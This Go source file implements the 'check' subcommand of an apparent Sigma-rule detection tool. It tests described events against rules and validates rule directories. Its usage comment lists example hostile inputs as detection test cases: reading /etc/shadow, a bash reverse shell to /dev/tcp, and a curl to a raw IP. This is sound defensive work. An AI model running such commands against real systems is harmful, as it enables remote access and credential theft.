package main

import (
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"os"
	"sort"
	"strings"

	"github.com/conor-sometimes/banken/internal/event"
	"github.com/conor-sometimes/banken/internal/ioc"
	"github.com/conor-sometimes/banken/internal/sigma"
)

// runCheck is the `banken check` subcommand: the detection engineer's / purple
// teamer's fast path. Describe one event -- a command line, field flags, or a
// full JSON event -- and it prints which rules fire, without touching a log or
// the cursor. The baseline rules are always loaded; -rules adds more.
//
//	banken check 'cat /etc/shadow'
//	banken check -image /bin/bash 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
//	banken check -json '{"image":"/usr/bin/curl","commandLine":"curl http://1.2.3.4"}'
func runCheck(args []string, stdout, stderr io.Writer) error {
	fs := flag.NewFlagSet("banken check", flag.ContinueOnError)
	fs.SetOutput(stderr)
	var f struct {
		image, user, target, parent, cwd, jsonStr, rules string
	}
	fs.StringVar(&f.image, "image", "", "Image: the executable path")
	fs.StringVar(&f.user, "user", "", "User")
	fs.StringVar(&f.target, "target", "", "TargetFilename")
	fs.StringVar(&f.parent, "parent", "", "ParentImage")
	fs.StringVar(&f.cwd, "cwd", "", "CurrentDirectory")
	fs.StringVar(&f.jsonStr, "json", "", "a full event as JSON (overrides the field flags)")
	fs.StringVar(&f.rules, "rules", "", "comma-separated extra rule dirs (on top of the baseline)")
	fs.Usage = func() {
		logln(stderr, "usage: banken check [flags] [command line...]")
		fs.PrintDefaults()
	}
	if err := fs.Parse(args); err != nil {
		return err
	}

	// Directory-preflight mode: `banken check <dir>` validates a whole rules
	// tree and exits non-zero on any bad rule, so an operator catches a broken
	// rule on their laptop before pushing it to the fleet (and the fleet puller
	// catches it before reloading 500 hosts). It is selected when the one
	// positional argument names an existing directory and no event was
	// described -- an event's command line is never a bare directory path.
	if rest := fs.Args(); len(rest) == 1 && f.jsonStr == "" && f.image == "" &&
		f.user == "" && f.target == "" && f.parent == "" && f.cwd == "" {
		if fi, serr := os.Stat(rest[0]); serr == nil && fi.IsDir() {
			return preflightDir(rest[0], stdout, stderr)
		}
	}

	ev, err := checkEvent(f.jsonStr, f.image, f.user, f.target, f.parent, f.cwd, fs.Args())
	if err != nil {
		return err
	}

	rules, problems := loadRules(splitComma(f.rules))
	for _, p := range problems {
		logAt(stderr, levelErr, "banken: rule error: %s", p.Error())
	}
	if len(rules) == 0 {
		return errors.New("no rules loaded")
	}

	hits := sigma.NewMatcher(rules).Match(ev)
	if len(hits) == 0 {
		logf(stdout, "no rules matched (%d loaded)\n", len(rules))
		return nil
	}
	sort.Slice(hits, func(i, j int) bool { return hits[i].Name < hits[j].Name })
	logf(stdout, "%d of %d rules matched:\n", len(hits), len(rules))
	for _, r := range hits {
		level := r.Level
		if level == "" {
			level = "medium"
		}
		title := r.Title
		if title == "" {
			title = "(no title)"
		}
		if r.Optional {
			// An optional rule is held back in a real run unless the operator
			// activates it; say so here so a check hit is not mistaken for a
			// shipped-on detection.
			title += " [optional: off unless activated]"
		}
		logf(stdout, "  [%-8s] %-32s %s\n", level, r.Name, title)
	}
	return nil
}

// preflightDir compiles every Sigma rule and IOC list under dir with the exact
// code path the daemon uses (sigma.LoadTree / ioc.LoadTree), prints a per-file
// error for each rule that did not compile and a one-line total, and returns an
// exitError with code 2 if any rule failed or the tree compiled zero rules.
// This is the operator's and the fleet puller's gate: a rules dir that does not
// pass here is never pushed or reloaded, so a broken rule is caught before it
// reaches a running daemon. A clean tree prints its count and returns nil
// (exit 0). The embedded baseline is deliberately NOT loaded here: this
// validates the operator's own tree, so its exit status reflects only that
// tree, not rules baked into the binary.
func preflightDir(dir string, stdout, stderr io.Writer) error {
	rules, problems := sigma.LoadTree(dir)
	for _, p := range problems {
		logAt(stderr, levelErr, "banken: rule error: %s", p.Error())
	}
	// A malformed IOC file is a hard error from ioc.LoadTree (it is reported the
	// same way a bad rule is, so the whole dir is validated, not just .yml).
	if _, err := ioc.LoadTree(dir); err != nil {
		logAt(stderr, levelErr, "banken: ioc error: %v", err)
		problems = append(problems, sigma.RuleError{Path: dir, Err: err})
	}

	if len(problems) > 0 {
		logf(stdout, "%s: %d rule(s) compiled, %d error(s)\n", dir, len(rules), len(problems))
		return exitError{code: 2, err: fmt.Errorf("%d rule file(s) failed to validate in %s", len(problems), dir)}
	}
	if len(rules) == 0 {
		logf(stdout, "%s: 0 rules compiled\n", dir)
		return exitError{code: 2, err: fmt.Errorf("no rules found in %s (nothing to load)", dir)}
	}
	logf(stdout, "%s: %d rule(s) compiled, 0 errors\n", dir, len(rules))
	return nil
}

// checkEvent builds the event to test from a JSON blob (if given) or the field
// flags plus any positional words joined as the command line.
func checkEvent(jsonStr, image, user, target, parent, cwd string, words []string) (event.Event, error) {
	if jsonStr != "" {
		var ev event.Event
		if err := json.Unmarshal([]byte(jsonStr), &ev); err != nil {
			return event.Event{}, fmt.Errorf("bad -json: %w", err)
		}
		return ev, nil
	}
	return event.Event{
		Image:            image,
		CommandLine:      strings.Join(words, " "),
		User:             user,
		TargetFilename:   target,
		ParentImage:      parent,
		CurrentDirectory: cwd,
	}, nil
}
